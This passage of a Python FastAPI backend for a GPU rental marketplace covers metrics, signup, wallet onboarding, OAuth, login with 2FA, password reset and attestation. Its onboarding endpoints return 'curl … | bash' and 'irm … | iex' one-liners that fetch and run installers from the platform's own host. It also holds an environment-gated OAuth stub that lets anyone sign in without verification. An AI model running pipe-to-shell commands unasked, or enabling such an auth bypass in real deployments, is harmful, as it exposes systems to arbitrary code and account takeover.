    """Scrape-time marketplace supply/seller gauges, computed LIVE from Postgres. Sellers
    are ephemeral: a stale heartbeat (older than HEARTBEAT_TIMEOUT_S) drops a spec out of
    'online' supply automatically here, without scraping the seller machine. Bounded labels
    only (gpu_class, country); seller ids never become labels. Best-effort — a query error
    yields no rows rather than breaking the scrape. Real supply excludes seeded demo nodes."""
    from db import (SellerSpec, ComputeTransaction, _utcnow,
                    financial_integrity, payout_backlog, seller_payable_by_mode)
    S = SellerSpec
    env = obsmod.ENVIRONMENT
    rows = []
    dbs = SessionLocal()
    try:
        # naive-UTC cutoff (matches reap_stale_specs); stored last_seen is naive.
        cutoff = (_utcnow() - timedelta(seconds=HEARTBEAT_TIMEOUT_S)).replace(tzinfo=None)
        demo = S.is_demo.is_(False)
        # "fresh" = online AND heartbeat within the window. Evaluated in SQL — we do NOT
        # load every SellerSpec row into memory (that was the perf finding).
        fresh = (demo, S.status == "online", S.last_seen.isnot(None), S.last_seen >= cutoff)

        def _agg(col, *crit):
            return dbs.query(func.coalesce(func.sum(col), 0)).filter(*crit).scalar() or 0

        def _uids(*crit):
            return {r[0] for r in dbs.query(distinct(S.user_id)).filter(*crit).all()}

        online_uids = _uids(*fresh)
        offline_uids = _uids(demo, S.status != "online")
        registered = dbs.query(func.count(distinct(S.user_id))).filter(demo).scalar() or 0
        agents_online = dbs.query(func.count(S.id)).filter(*fresh).scalar() or 0
        stale_specs = dbs.query(func.count(S.id)).filter(
            demo, S.status == "online",
            or_(S.last_seen.is_(None), S.last_seen < cutoff)).scalar() or 0
        reserved = _agg(
            case((S.total_units > S.available_units, S.total_units - S.available_units),
                 else_=0), *fresh)

        rows += [
            {"name": "petabyte_sellers_registered", "doc": "Distinct sellers with a listing",
             "labels": {"environment": env}, "value": registered},
            {"name": "petabyte_sellers_online", "doc": "Sellers with a fresh heartbeat",
             "labels": {"environment": env}, "value": len(online_uids)},
            {"name": "petabyte_sellers_offline", "doc": "Sellers with all specs offline",
             "labels": {"environment": env}, "value": len(offline_uids - online_uids)},
            {"name": "petabyte_sellers_stale", "doc": "Specs online but heartbeat expired",
             "labels": {"environment": env}, "value": stale_specs},
            {"name": "petabyte_agents_online", "doc": "Connected seller agents (fresh specs)",
             "labels": {"environment": env}, "value": agents_online},
            {"name": "petabyte_gpus_online", "doc": "Online GPUs",
             "labels": {"environment": env}, "value": _agg(S.gpu_count, *fresh)},
            {"name": "petabyte_gpus_available", "doc": "Available rentable units",
             "labels": {"environment": env}, "value": _agg(S.available_units, *fresh)},
            {"name": "petabyte_gpus_reserved", "doc": "Reserved units",
             "labels": {"environment": env}, "value": reserved},
            {"name": "petabyte_available_gpu_hours", "doc": "Available GPU-hours (units x max hrs)",
             "labels": {"environment": env},
             "value": _agg(S.available_units * S.duration, *fresh)},
        ]
        # GPUs by model (grouped in SQL) -> folded to a bounded gpu_class in Python.
        by_model = {}
        for model, n in dbs.query(S.gpu_model, func.coalesce(func.sum(S.gpu_count), 0)) \
                .filter(*fresh).group_by(S.gpu_model).all():
            gc = obsmod.gpu_model_to_class(model)
            by_model[gc] = by_model.get(gc, 0) + int(n or 0)
        for gc, n in by_model.items():
            rows.append({"name": "petabyte_gpus_by_model", "doc": "Online GPUs by class",
                         "labels": {"gpu_class": gc, "environment": env}, "value": n})
        # GPUs by country (grouped in SQL) -> normalized (strip/upper/[:2], fallback
        # 'unknown' only when empty, so a MISSING country is never mislabeled 'UN').
        by_country = {}
        for country, detected, n in dbs.query(
                S.country, S.detected_country, func.coalesce(func.sum(S.gpu_count), 0)) \
                .filter(*fresh).group_by(S.country, S.detected_country).all():
            cc = _norm_country(country, detected)
            by_country[cc] = by_country.get(cc, 0) + int(n or 0)
        for cc, n in by_country.items():
            rows.append({"name": "petabyte_gpus_by_country", "doc": "Online GPUs by country",
                         "labels": {"country": cc, "environment": env}, "value": n})
        # live job count (durable — survives a seller going offline)
        running = dbs.query(func.count(ComputeTransaction.id)).filter(
            ComputeTransaction.status == "RUNNING").scalar() or 0
        rows.append({"name": "petabyte_jobs_running", "doc": "Running jobs",
                     "labels": {"environment": env}, "value": running})
    except Exception:  # noqa: BLE001
        logger.debug("marketplace metrics query failed", exc_info=True)
    # Financial-integrity heartbeat (#286): ledger invariants + payout backlog, in SQL.
    # Isolated in its own try so a failure here never drops the supply gauges above.
    try:
        fi = financial_integrity(dbs)
        pb = payout_backlog(dbs)
        rows += [
            {"name": "petabyte_ledger_balanced",
             "doc": "1 iff the double-entry ledger balances (every tx and overall)",
             "labels": {"environment": env}, "value": 1 if fi["balanced"] else 0},
            {"name": "petabyte_ledger_imbalanced_tx",
             "doc": "Ledger transactions whose debits != credits (must be 0)",
             "labels": {"environment": env}, "value": fi["imbalanced_tx"]},
            {"name": "petabyte_ledger_net_minor",
             "doc": "Signed ledger sum credits-debits across all entries (must be 0)",
             "labels": {"environment": env}, "value": fi["net_minor"]},
            {"name": "petabyte_payout_obligations_unbatched",
             "doc": "Settled obligations owed to sellers but not yet placed in a batch",
             "labels": {"environment": env}, "value": pb["unbatched"]},
            {"name": "petabyte_oldest_unbatched_payout_age_seconds",
             "doc": "Age of the oldest unbatched payout obligation (payout backlog)",
             "labels": {"environment": env}, "value": pb["oldest_age_seconds"]},
        ]
        # Outstanding seller payable (minor units) split by money mode — never mix TEST/LIVE.
        for _mode, _minor in seller_payable_by_mode(dbs).items():
            rows.append({"name": "petabyte_seller_payable_minor",
                         "doc": "Outstanding seller payable (minor units) owed but not yet paid",
                         "labels": {"payment_mode": _mode or "unknown", "environment": env},
                         "value": _minor})
    except Exception:  # noqa: BLE001
        logger.debug("financial-integrity metrics query failed", exc_info=True)
    # Trust & integrity — the verification MOAT, made measurable. Reuses the same honest
    # counts as the public /trust page (single source of truth). All labels are bounded
    # (tier/status enumerations), never an id. Own try: never drops the gauges above.
    try:
        import trust as _trust
        ts = _trust.trust_summary(dbs)
        rows += [
            {"name": "petabyte_attested_gpus", "doc": "Attested GPUs (verifiable listings)",
             "labels": {"environment": env}, "value": ts["attested_gpus"]},
            {"name": "petabyte_confidential_nodes_active",
             "doc": "Nodes holding a FRESH confidential (TEE) attestation",
             "labels": {"environment": env}, "value": ts["confidential_nodes_active"]},
            {"name": "petabyte_jobs_completed_total", "doc": "Completed jobs (lifetime)",
             "labels": {"environment": env}, "value": ts["jobs_completed"]},
            {"name": "petabyte_results_content_bound",
             "doc": "Results bound to the sha256 of the real output bytes",
             "labels": {"environment": env}, "value": ts["results_content_bound"]},
            {"name": "petabyte_verifiable_receipts",
             "doc": "Jobs with a retained node signature (buyer-verifiable receipt)",
             "labels": {"environment": env}, "value": ts["verifiable_receipts"]},
            {"name": "petabyte_sellers_fraud_flagged",
             "doc": "Sellers with fraud on record (payouts frozen pending review)",
             "labels": {"environment": env}, "value": ts["sellers_fraud_flagged"]},
        ]
        for _tier, _n in (ts.get("trust_tiers") or {}).items():
            rows.append({"name": "petabyte_trust_tier_gpus",
                         "doc": "Attested GPUs by trust tier",
                         "labels": {"tier": _tier, "environment": env}, "value": _n})
        for _status, _n in (ts.get("quorum_checks_by_status") or {}).items():
            rows.append({"name": "petabyte_quorum_checks",
                         "doc": "Redundant re-execution (quorum) checks by outcome",
                         "labels": {"status": str(_status), "environment": env}, "value": _n})
    except Exception:  # noqa: BLE001
        logger.debug("trust-integrity metrics query failed", exc_info=True)
    # Disaster-recovery: age of the last successful DB backup (alert when it grows), plus
    # success/failure counts. Own try — a query error never drops the gauges above.
    try:
        import backup as _bk
        bs = _bk.backup_status(dbs)
        rows += [
            {"name": "petabyte_db_backup_last_age_seconds",
             "doc": "Seconds since the last SUCCESSFUL database backup (-1 if none yet)",
             "labels": {"environment": env},
             "value": (bs["last_backup_age_seconds"] if bs["last_backup_age_seconds"] is not None else -1)},
            {"name": "petabyte_db_backups_ok", "doc": "Successful database backups currently retained",
             "labels": {"environment": env}, "value": bs["ok_count"]},
            {"name": "petabyte_db_backups_failed", "doc": "Failed database backup attempts on record",
             "labels": {"environment": env}, "value": bs["failed_count"]},
            {"name": "petabyte_db_backup_bytes", "doc": "Total compressed size of retained backups",
             "labels": {"environment": env}, "value": bs["total_bytes"]},
        ]
    except Exception:  # noqa: BLE001
        logger.debug("backup metrics query failed", exc_info=True)
    # Operations gauges — the product surfaces beyond raw GPU supply: buyer VMs, distributed
    # clusters, spare-disk rental, teams (shared wallets), and escrowed buyer money. Live DB
    # state, bounded labels only. Own try so a query error never drops the gauges above.
    try:
        from db import VMRoute, MultiNodeJob, Organization, Booking, User, Task
        vm_active = dbs.query(func.count(VMRoute.id)).filter(
            VMRoute.status.in_(("starting", "running", "migrating"))).scalar() or 0
        vm_migr = dbs.query(func.coalesce(func.sum(VMRoute.migrations), 0)).scalar() or 0
        rows += [
            {"name": "petabyte_vms_active",
             "doc": "Buyer VMs currently active (starting/running/migrating)",
             "labels": {"environment": env}, "value": vm_active},
            {"name": "petabyte_vm_migrations_cumulative",
             "doc": "Cumulative VM failovers/migrations across all routes",
             "labels": {"environment": env}, "value": int(vm_migr)},
        ]
        for _st, _n in dbs.query(MultiNodeJob.status, func.count(MultiNodeJob.id)).filter(
                MultiNodeJob.kind == "distributed").group_by(MultiNodeJob.status).all():
            rows.append({"name": "petabyte_distributed_clusters",
                         "doc": "Distributed (multi-node) clusters by status",
                         "labels": {"status": str(_st or "unknown"), "environment": env},
                         "value": int(_n or 0)})
        disk_nodes = dbs.query(func.count(SellerSpec.id)).filter(
            SellerSpec.disk_enabled.is_(True)).scalar() or 0
        disk_gb = dbs.query(func.coalesce(func.sum(SellerSpec.disk_alloc_gb), 0)).filter(
            SellerSpec.disk_enabled.is_(True)).scalar() or 0
        rows += [
            {"name": "petabyte_disk_rental_nodes", "doc": "Nodes actively renting spare disk",
             "labels": {"environment": env}, "value": disk_nodes},
            {"name": "petabyte_disk_rental_gb_pledged", "doc": "Total GB pledged for disk rental",
             "labels": {"environment": env}, "value": int(disk_gb)},
        ]
        orgs_n = dbs.query(func.count(Organization.id)).scalar() or 0
        orgs_bal = dbs.query(func.coalesce(func.sum(Organization.balance), 0)).scalar() or 0
        rows += [
            {"name": "petabyte_teams_total", "doc": "Teams (shared-wallet orgs)",
             "labels": {"environment": env}, "value": orgs_n},
            {"name": "petabyte_teams_pooled_balance_usd",
             "doc": "Total balance pooled in team wallets (USD)",
             "labels": {"environment": env}, "value": float(orgs_bal)},
        ]
        in_escrow = dbs.query(func.coalesce(func.sum(Booking.gross_amount), 0.0)).filter(
            Booking.status == "escrowed", Booking.test.is_(False)).scalar() or 0.0
        rows.append({"name": "petabyte_escrow_held_usd",
                     "doc": "Buyer money currently held in escrow (live only, USD)",
                     "labels": {"environment": env}, "value": float(in_escrow)})
        wallet_usd = dbs.query(func.coalesce(func.sum(User.balance), 0)).scalar() or 0
        rows.append({"name": "petabyte_wallet_balance_usd",
                     "doc": "Total buyer wallet balance held across all users (USD)",
                     "labels": {"environment": env}, "value": float(wallet_usd)})
        disk_used = dbs.query(func.coalesce(func.sum(SellerSpec.disk_used_gb), 0)).filter(
            SellerSpec.disk_enabled.is_(True)).scalar() or 0
        rows.append({"name": "petabyte_disk_rental_gb_used",
                     "doc": "GB actually reported used across disk-rental nodes",
                     "labels": {"environment": env}, "value": float(disk_used)})
        # queue depth + oldest-pending age — closes the empty workers/queue panels
        pending = dbs.query(func.count(Task.id)).filter(Task.status == "pending").scalar() or 0
        rows.append({"name": "petabyte_pending_tasks", "doc": "Buyer tasks awaiting a node",
                     "labels": {"queue": "tasks", "environment": env}, "value": int(pending)})
        oldest = dbs.query(func.min(Task.created_at)).filter(Task.status == "pending").scalar()
        age = 0
        if oldest is not None:
            now = _utcnow().replace(tzinfo=None)
            if getattr(oldest, "tzinfo", None) is not None:
                oldest = oldest.replace(tzinfo=None)
            age = max(0, int((now - oldest).total_seconds()))
        rows.append({"name": "petabyte_oldest_pending_task_age_seconds",
                     "doc": "Age of the oldest pending task (0 when the queue is empty)",
                     "labels": {"queue": "tasks", "environment": env}, "value": age})
    except Exception:  # noqa: BLE001
        logger.debug("operations metrics query failed", exc_info=True)
    finally:
        dbs.close()
    # Data-API monetization gauges — so revenue is MEASURED, not guessed.
    dbr = SessionLocal()
    try:
        r = data_api_revenue(dbr)
        rows += [
            {"name": "petabyte_data_api_revenue_usd",
             "doc": "All-time data-API revenue booked to platform revenue (USD)",
             "labels": {"environment": env}, "value": r["revenue_usd_total"]},
            {"name": "petabyte_data_api_revenue_usd_month",
             "doc": "Data-API revenue this calendar month (USD)",
             "labels": {"environment": env}, "value": r["revenue_usd_month"]},
            {"name": "petabyte_data_api_billed_calls",
             "doc": "All-time billed (paid) data-API calls",
             "labels": {"environment": env}, "value": r["billed_calls_total"]},
            {"name": "petabyte_data_api_paying_accounts_month",
             "doc": "Accounts that paid for data-API calls this month",
             "labels": {"environment": env}, "value": r["paying_accounts_month"]},
        ]
    except Exception:  # noqa: BLE001
        logger.debug("data-api revenue metrics query failed", exc_info=True)
    finally:
        dbr.close()
    return rows


# Register the scrape-time collector once (no-op if prometheus_client is absent).
obsmod.register_marketplace_collector(_marketplace_metrics)


# ------------------- AUTH -------------------

@app.post("/register_user", tags=["account"])
def register_user(data: UserRegisterModel, request: Request, db: Session = Depends(get_db)):
    user = create_user(db, data.username, data.password)
    if not user:
        raise HTTPException(status_code=400, detail="User already exists")
    # Prefer the code in the request body; fall back to the first-touch cookie. This is
    # what captures the common journey: click the link, browse, come back later, sign up.
    ref_code = data.ref or request.cookies.get("pb_ref")
    if ref_code:
        from db import apply_referral
        apply_referral(db, user, ref_code, signup_meta=_client_ip(request))
    # top of the growth funnel — mirrored to product analytics via observability.event()
    obs.event(EVENTS.USER_SIGNED_UP, message="user registered",
              user_id=user.id, referred=bool(ref_code))
    resp = JSONResponse({"status": "ok", "msg": "User registered"})
    # consume the attribution cookie so a later signup on a shared machine isn't mis-credited
    if request.cookies.get("pb_ref"):
        resp.delete_cookie("pb_ref", path="/")
    return resp


class NodeQuickstartModel(BaseModel):
    wallet: str = Field(..., min_length=8, max_length=128)
    chain: Optional[str] = Field(None, max_length=32)   # informational: eth|polygon|base|arbitrum|optimism


# EVM address: 0x + 40 hex. USDC lives on many EVM chains (Ethereum/Polygon/Base/Arbitrum/
# Optimism), all sharing this format. Non-EVM chains are a documented later extension.
_EVM_ADDR_RE = re.compile(r"^0x[0-9a-fA-F]{40}$")


@app.post("/nodes/quickstart", tags=["seller"])
def node_quickstart(data: NodeQuickstartModel, request: Request, db: Session = Depends(get_db)):
    """Miner-style onboarding: paste the USDC wallet you want to be paid to and get a
    ready-to-run installer command back — no email, no password, no signup form.

    What it does — and, just as importantly, what it does NOT:
      * creates (or reuses) a lightweight seller identity keyed to the wallet. The password
        is random and unusable; the node authenticates with the returned API key, not a login.
      * records the wallet as your USDC payout DESTINATION, **unverified**. This never makes
        you payout-ready and never moves a cent: withdrawing earnings later requires identity
        verification (KYC), exactly as regulation demands — that gate lives in the payout path,
        not here. Onboarding is the only thing this makes frictionless.
      * OFAC-screens the address when the sanctions list is configured (the binding, fail-closed
        screen runs again at payout).
      * returns a one-line, non-interactive installer (curl … | bash / irm … | iex) whose URL
        carries a short enrollment token — no key to paste, nothing to type.

    All nodes started with the same wallet share one balance — like workers under one mining
    address. Bookability for PAID jobs still depends on the live payout/eligibility checks; a
    wallet-only node can come online and benchmark, and becomes rentable once its owner verifies.
    """
    import sanctions
    wallet = (data.wallet or "").strip()
    if not _EVM_ADDR_RE.match(wallet):
        raise HTTPException(status_code=422, detail=(
            "Enter a valid USDC wallet address (0x… on Ethereum, Polygon, Base, Arbitrum, or Optimism)."))
    wallet_l = wallet.lower()   # EVM addresses are case-insensitive — normalise for identity + screen
    if sanctions.ofac_addresses_available() and sanctions.is_sanctioned_address(wallet_l):
        raise HTTPException(status_code=403, detail="This address cannot be onboarded.")
    username = "wallet_" + wallet_l[2:]     # deterministic identity (drop the 0x prefix)
    me = get_user_by_username(db, username)
    new_account = False
    if me is None:
        me = create_user(db, username, secrets.token_urlsafe(32))   # random, unusable password
        if me is None:                                              # lost a create race -> reuse
            me = get_user_by_username(db, username)
        else:
            new_account = True
    if me is None:
        raise HTTPException(status_code=500, detail="Could not create your node identity.")
    if me.role != "seller":
        set_role(db, username, "seller")
    # Record the wallet as an UNVERIFIED usdc payout destination (idempotent). verified stays
    # False, so request_payout() refuses it until KYC — capturing the destination moves no money.
    have = any(pm.kind == "usdc" and (pm.destination or "").lower() == wallet_l
               for pm in list_payout_methods(db, me.id))
    if not have:
        add_payout_method(db, me, "usdc", wallet, label="mining wallet (verify at payout)")
    # Wallet onboarding auto-prices from each node's benchmark, so no pinned price on the token.
    tok = create_install_token(db, me)
    base = _base_url(request)
    if new_account:
        obs.event(EVENTS.USER_SIGNED_UP, message="wallet-only node onboarding", user_id=me.id, referred=False)
    return {"status": "ok", "wallet": wallet, "new_account": new_account, "payout_ready": False,
            "install_token": tok.token,
            "install": {"linux": "curl -fsSL %s/i/%s | bash" % (base, tok.token),
                        "windows": "irm %s/i/%s.ps1 | iex" % (base, tok.token)},
            "note": "Onboarding only — withdrawing earnings later requires identity verification (KYC)."}


class InstallTokenModel(BaseModel):
    price: Optional[float] = Field(None, ge=0, le=1000)


@app.post("/nodes/install_token", tags=["seller"])
def make_install_token(data: InstallTokenModel, request: Request,
                       user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Create a short one-line installer link for the SIGNED-IN seller (the account path's
    equivalent of /nodes/quickstart). An optional price pins the listing rate; omit it and each
    node auto-prices from its own GPU benchmark. Returns the same non-interactive one-liners."""
    me = get_user_by_username(db, _username(user))
    if me is None:
        raise HTTPException(status_code=401, detail="Sign in first.")
    if me.role != "seller":
        set_role(db, me.username, "seller")
    price = data.price if (data.price and data.price > 0) else None
    tok = create_install_token(db, me, price=price)
    base = _base_url(request)
    return {"status": "ok", "install_token": tok.token,
            "install": {"linux": "curl -fsSL %s/i/%s | bash" % (base, tok.token),
                        "windows": "irm %s/i/%s.ps1 | iex" % (base, tok.token)}}


# ------------------- GOOGLE SIGN-IN -------------------

@app.get("/auth/google/login")
def google_login(db: Session = Depends(get_db)):
    """Redirect to Google's consent screen. Stub short-circuits to the callback."""
    # TODO(stub): Google OAuth stub login — NEVER enable in production (stub.md #5)
    if os.getenv("GOOGLE_OAUTH_STUB", "").lower() == "true":
        return RedirectResponse(url="/auth/google/callback?code=stub&email=info@petabyte.market")
    cid = os.environ.get("GOOGLE_CLIENT_ID")
    redirect = os.environ.get("GOOGLE_REDIRECT_URI")
    if not cid or not redirect:
        raise HTTPException(status_code=503, detail="Google sign-in not configured")
    from urllib.parse import urlencode
    q = urlencode({"client_id": cid, "redirect_uri": redirect, "response_type": "code",
                   "scope": "openid email profile", "access_type": "online",
                   "prompt": "select_account"})
    return RedirectResponse(url="https://accounts.google.com/o/oauth2/v2/auth?" + q)


@app.get("/auth/google/callback")
def google_callback(request: Request, code: str = Query(...), email: Optional[str] = Query(None),
                    db: Session = Depends(get_db)):
    """Exchange the code for the user's email, create-or-login, issue our JWT."""
    # TODO(stub): Google OAuth stub login — NEVER enable in production (stub.md #5)
    if os.getenv("GOOGLE_OAUTH_STUB", "").lower() == "true":
        user_email = email or "info@petabyte.market"
        # The stub is a dev bypass, not a real provider verification — it must NEVER mint a
        # verified (hence potentially admin/payout-eligible) identity.
        email_verified = False
    else:
        import httpx as _hx
        tok = _hx.post("https://oauth2.googleapis.com/token", timeout=20, data={
            "code": code, "client_id": os.environ["GOOGLE_CLIENT_ID"],
            "client_secret": os.environ["GOOGLE_CLIENT_SECRET"],
            "redirect_uri": os.environ["GOOGLE_REDIRECT_URI"],
            "grant_type": "authorization_code"}).json()
        info = _hx.get("https://openidconnect.googleapis.com/v1/userinfo", timeout=20,
                       headers={"Authorization": f"Bearer {tok['access_token']}"}).json()
        user_email = info.get("email")
        if not user_email:
            raise HTTPException(status_code=401, detail="Google did not return an email")
        # Honour Google's own verification claim: a Google-verified email is a trusted identity
        # (unlocks payout eligibility and, if allowlisted, admin).
        email_verified = bool(info.get("email_verified"))
    u = get_or_create_oauth_user(db, user_email, "google", email_verified=email_verified)
    token = create_access_token({"sub": u.username, "role": u.role})
    # Set the session as an HttpOnly cookie (never a URL fragment — a #t=JWT in the address
    # bar leaks into history, referrers and JS). Clean redirect, no token in the URL.
    resp = RedirectResponse(url="/console", status_code=303)
    _set_session_cookies(resp, request, token)
    return resp

def _set_session_cookies(resp: Response, request: Request, token: str) -> str:
    """Set the HttpOnly JWT session cookie + the readable double-submit CSRF token (which the
    browser also treats as its 'signed in' hint). Returns the CSRF token.

    `Secure` keeps the cookies off plaintext. Behind a TLS-terminating proxy the observed
    request scheme is often plain http, so relying on it alone would ship the session cookie
    without Secure in production — force Secure whenever ENVIRONMENT=production or the proxy
    reports X-Forwarded-Proto: https (audit L3). Local http dev (ENVIRONMENT!=production) is
    unaffected, so cookies still work over http://localhost."""
    xf_proto = request.headers.get("x-forwarded-proto", "").split(",")[0].strip().lower()
    secure = (request.url.scheme == "https" or xf_proto == "https"
              or os.getenv("ENVIRONMENT", "").lower() == "production")
    csrf = secrets.token_urlsafe(32)
    resp.set_cookie(SESSION_COOKIE, token, max_age=SESSION_MAX_AGE, httponly=True,
                    secure=secure, samesite="lax", path="/")
    resp.set_cookie(CSRF_COOKIE, csrf, max_age=SESSION_MAX_AGE, httponly=False,
                    secure=secure, samesite="lax", path="/")
    return csrf


def _clear_session_cookies(resp: Response) -> None:
    resp.delete_cookie(SESSION_COOKIE, path="/")
    resp.delete_cookie(CSRF_COOKIE, path="/")


@app.post("/logout", tags=["account"])
def logout():
    """Sign out: clear the browser session cookies. The JWT cookie is HttpOnly, so JS can't
    delete it — logout must go through the server. Bearer/API clients simply drop their token."""
    resp = JSONResponse({"ok": True})
    _clear_session_cookies(resp)
    return resp


@app.post("/login", tags=["account"])
def login(request: Request, form_data: OAuth2PasswordRequestForm = Depends(),
          otp: str = Form(None), db: Session = Depends(get_db)):
    # Throttle by (IP, username): guessing one account can't lock out a colleague
    # behind the same office NAT, and a valid password is never refused because
    # someone else was guessing. Only FAILED attempts burn the budget.
    ip = _client_ip(request) or "?"
    key = f"login:{ip}:{form_data.username.lower()}"
    retry = _rl_blocked(key, LOGIN_MAX_FAILS, LOGIN_WINDOW_S)
    if retry:
        raise HTTPException(
            status_code=429,
            detail={"code": "RATE_LIMIT_EXCEEDED",
                    "message": f"Too many failed sign-in attempts. Try again in {retry} seconds."},
            headers={"Retry-After": str(retry)})
    user = login_user(db, form_data.username, form_data.password)
    if not user:
        _rl_record_failure(key)
        obsmod.inc_metric("petabyte_logins_total", outcome="failure",
                          environment=obsmod.ENVIRONMENT)
        obsmod.inc_metric("petabyte_auth_failures_total", reason="bad_credentials",
                          environment=obsmod.ENVIRONMENT)
        audit(db, "auth.login_failed", actor=form_data.username, ip=ip,
              detail={"username": form_data.username})
        raise HTTPException(status_code=400, detail="Invalid credentials")
    _RL_BUCKETS.pop(key, None)      # a success clears the slate for this account
    # SECOND FACTOR: password alone is not enough once 2FA is on. Require a valid TOTP code
    # (from the authenticator app) or a single-use backup code before issuing the session token.
    if user.totp_enabled:
        code = (otp or "").strip()
        if not code:
            obsmod.inc_metric("petabyte_logins_total", outcome="twofa_required",
                              environment=obsmod.ENVIRONMENT)
            raise HTTPException(status_code=401, detail={
                "code": "TOTP_REQUIRED",
                "message": "Enter the 6-digit code from your authenticator app."})
        ok2 = False
        try:
            sec = open_secret(user.totp_secret) if user.totp_secret else None
            ok2 = bool(sec and totp.verify(sec, code))
        except Exception:  # noqa: BLE001
            ok2 = False
        if not ok2:                                   # fall back to a single-use recovery code
            ok2 = consume_backup_code(db, user, code.replace("-", "").replace(" ", "").lower())
        if not ok2:
            _rl_record_failure(key)
            obsmod.inc_metric("petabyte_logins_total", outcome="twofa_failed",
                              environment=obsmod.ENVIRONMENT)
            obsmod.inc_metric("petabyte_auth_failures_total", reason="totp",
                              environment=obsmod.ENVIRONMENT)
            audit(db, "auth.2fa_failed", actor=user, ip=ip)
            raise HTTPException(status_code=401, detail={
                "code": "TOTP_INVALID",
                "message": "That code is incorrect or expired — try again."})
    obsmod.inc_metric("petabyte_logins_total", outcome="success",
                      environment=obsmod.ENVIRONMENT)
    audit(db, "auth.login", actor=user, ip=ip)
    token = create_access_token({"sub": user.username, "role": user.role})
    # Return the token in the body (CLI / API clients keep using Authorization: Bearer) AND set
    # it as an HttpOnly cookie for browsers (so XSS can't read the session). Both are honored by
    # get_current_user; browsers additionally send the CSRF token on unsafe requests.
    resp = JSONResponse({"access_token": token, "token_type": "bearer"})
    _set_session_cookies(resp, request, token)
    return resp


@app.post("/change_role")
def change_role(data: RoleModel, user: dict = Depends(get_current_user),
                db: Session = Depends(get_db)):
    try:
        new_role = set_role(db, _username(user), data.role)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))
    audit(db, "account.role_change", actor=_username(user), resource_type="user",
          resource_id=_username(user), detail={"role": new_role})
    return {"status": "ok", "msg": f"Role changed to {new_role}"}


# ------------------- PASSWORD RESET -------------------
# Self-service reset. A signed, short-lived token carries the username plus a
# fingerprint of the CURRENT password hash ('pv'); once the password changes the
# fingerprint changes, so a used (or stale) link stops working — single-use-ish
# without a new table. Google-only accounts have no usable password to reset.
PWRESET_TTL_MIN = 30


class ForgotPasswordModel(BaseModel):
    identifier: str          # username OR email


class ResetPasswordModel(BaseModel):
    token: str
    new_password: str


def _pw_fingerprint(user) -> str:
    import hashlib
    return hashlib.sha256((user.password or "").encode()).hexdigest()[:16]


def _pwreset_token(user) -> str:
    return create_access_token(
        {"sub": user.username, "purpose": "pwreset", "pv": _pw_fingerprint(user)},
        expires_delta=timedelta(minutes=PWRESET_TTL_MIN))


def _find_user_by_identifier(db, identifier: str):
    from db import User
    ident = (identifier or "").strip()
    if not ident:
        return None
    u = get_user_by_username(db, ident)
    if u:
        return u
    return db.query(User).filter(User.email.isnot(None),
                                 func.lower(User.email) == ident.lower()).first()


@app.post("/password/forgot", tags=["account"])
def password_forgot(body: ForgotPasswordModel, request: Request, db: Session = Depends(get_db)):
    """Start a password reset. ALWAYS returns the same message (no account
    enumeration). If the identifier matches an account WITH an email, a branded
    reset link is emailed via Mailgun. Rate-limited by IP."""
    generic = {"ok": True,
               "message": "If an account matches, we've emailed a password reset link."}
    ip = _client_ip(request) or "?"
    if _rl_blocked(f"pwforgot:{ip}", 10, 3600):
        return generic          # silently absorb abuse; never reveal anything
    user = _find_user_by_identifier(db, body.identifier)
    if user and user.email:
        try:
            base = (os.getenv("PUBLIC_BASE_URL") or str(request.base_url)).rstrip("/")
            reset_url = f"{base}/reset?token={_pwreset_token(user)}"
            from email_service import get_email_service, EmailError, EmailConfigError
            try:
                get_email_service().send_password_reset(
                    user.email, reset_url=reset_url, ttl_minutes=PWRESET_TTL_MIN)
            except EmailConfigError:
                logger.warning("password reset requested but email is not configured; link not sent")
            except EmailError:
                logger.exception("password reset email send failed")
            audit(db, "password.reset_requested", actor=user.username,
                  resource_type="user", resource_id=user.username, ip=ip)
        except Exception:
            logger.exception("password reset flow error")
    return generic


@app.post("/password/reset", tags=["account"])
def password_reset(body: ResetPasswordModel, request: Request, db: Session = Depends(get_db)):
    """Complete a password reset with a token from the emailed link."""
    from db import hash_password
    if len((body.new_password or "")) < 8:
        raise HTTPException(status_code=422, detail="Password must be at least 8 characters.")
    try:
        payload = verify_token(body.token)
    except ValueError:
        raise HTTPException(status_code=400, detail="This reset link is invalid or has expired.")
    if payload.get("purpose") != "pwreset":
        raise HTTPException(status_code=400, detail="This reset link is invalid.")
    user = get_user_by_username(db, payload.get("sub", ""))
    if not user or payload.get("pv") != _pw_fingerprint(user):
        raise HTTPException(status_code=400,
                            detail="This reset link has already been used or is no longer valid.")
    user.password = hash_password(body.new_password)
    db.commit()
    audit(db, "password.reset", actor=user.username, resource_type="user",
          resource_id=user.username, ip=_client_ip(request))
    return {"ok": True, "message": "Password updated. You can now sign in."}


@app.get("/reset", response_class=HTMLResponse)
@app.get("/reset-password", response_class=HTMLResponse)
def reset_password_page():
    return RESET_HTML


# ------------------- SELLER -------------------

@app.post("/register_specs", tags=["seller"])
def register_specs(spec: SpecModel, owner=Depends(seller_actor),
                   db: Session = Depends(get_db)):
    db_spec = save_specs(db, owner, spec.model_dump())
    return {"status": "ok", "spec_id": db_spec.id,
            "attested": db_spec.attested, "available_units": db_spec.available_units}


@app.post("/prove", tags=["seller"])
def submit_proof(data: AttestationModel, owner=Depends(seller_actor),
                 db: Session = Depends(get_db)):
    spec = get_spec_by_id(db, data.spec_id)
    if not spec or spec.user_id != owner.id:
        raise HTTPException(status_code=404, detail="Spec not found")
    try:
        verify_attestation(data.attestation, data.signature, data.pubkey)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=f"Attestation failed: {e}")
    spec.attested = True
    spec.attested_at = datetime.now(timezone.utc)
    spec.attest_pubkey = data.pubkey   # bind future signed results to this key
    db.add(spec); db.commit()
    return {"status": "ok", "msg": "Attestation verified", "spec_id": spec.id}


@app.post("/attestation/challenge")
def attestation_challenge(data: ChallengeModel, user: dict = Depends(get_current_user),
                          db: Session = Depends(get_db)):
    """Issue a one-time nonce the seller's TEE must embed in its report."""
    owner = _require_seller(db, user)
    spec = get_spec_by_id(db, data.spec_id)
    if not spec or spec.user_id != owner.id:
        raise HTTPException(status_code=404, detail="Spec not found")
    nonce = create_challenge(db, spec)
    return {"nonce": nonce, "expires_in": 300}


@app.post("/prove_tee")
def prove_tee(data: TEEProveModel, user: dict = Depends(get_current_user),
              db: Session = Depends(get_db)):
    """Verify a TEE remote-attestation report and mark the spec confidential.

    This proves the buyer's code will run inside an enclave the SELLER cannot
